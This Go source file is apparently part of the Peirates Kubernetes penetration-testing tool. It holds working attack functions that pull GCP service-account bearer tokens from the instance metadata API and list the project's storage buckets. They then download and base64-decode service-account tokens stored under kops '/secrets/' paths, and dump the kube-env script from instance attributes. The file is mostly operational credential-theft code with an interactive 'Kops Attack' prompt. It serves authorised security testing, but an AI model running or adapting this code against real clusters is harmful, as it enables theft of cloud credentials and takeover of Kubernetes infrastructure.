package peirates

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"regexp"
	"strings"
	"time"
)

// Tokens returned by the metadata API will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
type GCPToken struct {
	Token          string `json:"access_token"`
	Expires        int64  `json:"expires_in"`
	ExpirationTime time.Time
	Type           string `json:"token_type"`
}

// GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token, a time it will expire and an error
func GetGCPBearerTokenFromMetadataAPI(account string) (string, time.Time, error) {

	headers := []HeaderLine{
		HeaderLine{"Metadata-Flavor", "Google"},
	}
	baseURL := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
	urlSvcAccount := baseURL + account + "/token"

	reqTokenRaw, statusCode, err := GetRequest(urlSvcAccount, headers, false)
	if err != nil {
		fmt.Println("GetRequest in GetGCPBearerTokenFromMetadataAPI() failed with error", err)
		return "", time.Now(), err
	}

	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) || (statusCode != 200) {
		errorString := "[-] Error - could not perform request for " + urlSvcAccount
		println(errorString)
		return "", time.Now(), errors.New(errorString)
	}

	var token GCPToken
	err = json.Unmarshal([]byte(reqTokenRaw), &token)
	if err != nil {
		return "", time.Now(), err
	}

	// Remove any padding (...) from the token value.
	// Regexp: ^(.*[^.])\.*$ - grab the first match group from this.

	re := regexp.MustCompile(`^(.*[^.])\.*$`)
	if re.Match([]byte(token.Token)) {
		matches := re.FindSubmatch([]byte(token.Token))
		token.Token = string(matches[1])
	}

	if token.Type == "Bearer" {
		now := time.Now()
		expiration := now.Add(time.Duration(token.Expires))
		return token.Token, expiration, nil
	} else {
		errorStr := "[-] Error - could not find token in returned body text: " + string(reqTokenRaw)
		println(errorStr)
		return "", time.Now(), errors.New(errorStr)
	}
}

func KopsAttackGCP(serviceAccounts *[]ServiceAccount) (err error) {
	var storeTokens string
	var placeTokensInStore bool

	println(`
	[1] Store all tokens found in Peirates data store
	[2] Retrieve all tokens - I will copy and paste
	`)
	fmt.Printf("\nPeirates (Kops Attack - GCP):># ")

	_, err = fmt.Scanln(&storeTokens)
	if err != nil {
		println("Problem with scanln: %v", err)
	}
	storeTokens = strings.TrimSpace(storeTokens)

	if storeTokens == "1" {
		placeTokensInStore = true
	}

	token, _, err := GetGCPBearerTokenFromMetadataAPI("default")
	if err != nil {
		msg := "[-] Could not get GCP default token from metadata API"
		println(msg)
		return errors.New(msg)
	} else {
		println("[+] Got default token for GCP - preparing to use it for GCS:", token)
	}

	// Need to get project ID from metadata API
	var headers []HeaderLine
	headers = []HeaderLine{
		HeaderLine{"Metadata-Flavor", "Google"},
	}
	projectID, _, err := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
	if err != nil {
		return err
	}
	if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
		msg := "[-] Could not get GCP project from metadata API"
		println(msg)
		return errors.New(msg)
	}
	println("[+] Got numberic project ID", projectID)

	// Get a list of buckets, maintaining the same header and adding two lines
	headers = []HeaderLine{
		HeaderLine{"Authorization", "Bearer " + token},
		HeaderLine{"Accept", "json"},
		HeaderLine{"Metadata-Flavor", "Google"}}

	// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
	urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
	bucketListRaw, _, err := GetRequest(urlListBuckets, headers, false)
	if err != nil {
		return err
	}
	if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
		msg := "[-] blank bucket list or error retriving bucket list"
		println(msg)
		return errors.New(msg)
	}
	bucketListLines := strings.Split(string(bucketListRaw), "\n")

	// Build our list of bucket URLs
	var bucketUrls []string
	for _, line := range bucketListLines {
		if strings.Contains(line, "selfLink") {
			url := strings.Split(line, "\"")[3]
			bucketUrls = append(bucketUrls, url)
		}
	}

	// In every bucket URL, look at the objects
	// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
	// We use the same headers[] from the previous GET request.
eachbucket:
	for _, line := range bucketUrls {
		println("Checking bucket for credentials:", line)
		urlListObjects := line + "/o"
		bodyListObjects, _, err := GetRequest(urlListObjects, headers, false)
		if (err != nil) || (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
			continue
		}
		objectListLines := strings.Split(string(bodyListObjects), "\n")

		// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
		for _, line := range objectListLines {
			if strings.Contains(line, "selfLink") {
				if strings.Contains(line, "%2Fsecrets%2F") {
					objectURL := strings.Split(line, "\"")[3]
					// Find the substring that tells us this service account token's name
					start := strings.LastIndex(objectURL, "%2F") + 3
					serviceAccountName := objectURL[start:]
					println("\n[+] Getting service account for:", serviceAccountName)

					// Get the contents of the bucket to get the service account token
					saTokenURL := objectURL + "?alt=media"

					// We use the same headers[] from the previous GET request.
					bodyToken, statusCode, err := GetRequest(saTokenURL, headers, false)
					if (err != nil) || (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) || (statusCode != 200) {
						continue eachbucket
					}
					tokenLines := strings.Split(string(bodyToken), "\n")

					for _, line := range tokenLines {
						// Now parse this line to get the token
						encodedToken := strings.Split(line, "\"")[3]
						token, err := base64.StdEncoding.DecodeString(encodedToken)
						if err != nil {
							println("[-] Could not decode token.")
						} else {
							tokenString := string(token)
							println(tokenString)

							if placeTokensInStore {
								tokenName := "GCS-acquired: " + string(serviceAccountName)
								println("[+] Storing token as:", tokenName)
								AddNewServiceAccount(tokenName, tokenString, "GCS Bucket", serviceAccounts)
							}
						}

					}

				}
			}
		}
	}

	return nil

}

func attackKubeEnvGCP(interactive bool) {
	// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers

	var headers = []HeaderLine{
		{"Metadata-Flavor", "Google"},
	}
	kubeEnv, statusCode, err := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
	if err != nil {
		fmt.Println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
		fmt.Println("Error was", err)
		pauseToHitEnter(interactive)
		return
	}
	if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) || (statusCode != 200) {
		println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
		if statusCode != 200 {
			fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", statusCode)
		}
		pauseToHitEnter(interactive)
		return
	}
	kubeEnvLines := strings.Split(string(kubeEnv), "\n")
	for _, line := range kubeEnvLines {
		println(line)
	}
}

func getGCPToken(interactive bool) {
	// TODO: Store the GCP token and display, to bring this inline with the GCP functionality.

	// Make a request for a list of service account(s)
	var headers []HeaderLine
	headers = []HeaderLine{
		{"Metadata-Flavor", "Google"},
	}
	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
	svcAcctListRaw, _, err := GetRequest(url, headers, false)
	if (err != nil) || (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
		pauseToHitEnter(interactive)
		return
	}

	// Parse the output service accounts into svcAcctListLines
	svcAcctListLines := strings.Split(string(svcAcctListRaw), "\n")

	// For each line found found, request a token corresponding to that line and print it.
	for _, line := range svcAcctListLines {

		if strings.TrimSpace(string(line)) == "" {
			continue
		}
		account := strings.TrimRight(string(line), "/")

		fmt.Printf("\n[+] GCP Credentials for account %s\n\n", account)
		token, _, err := GetGCPBearerTokenFromMetadataAPI(account)
		if err == nil {
			println(token)
		}
	}
	println(" ")
}
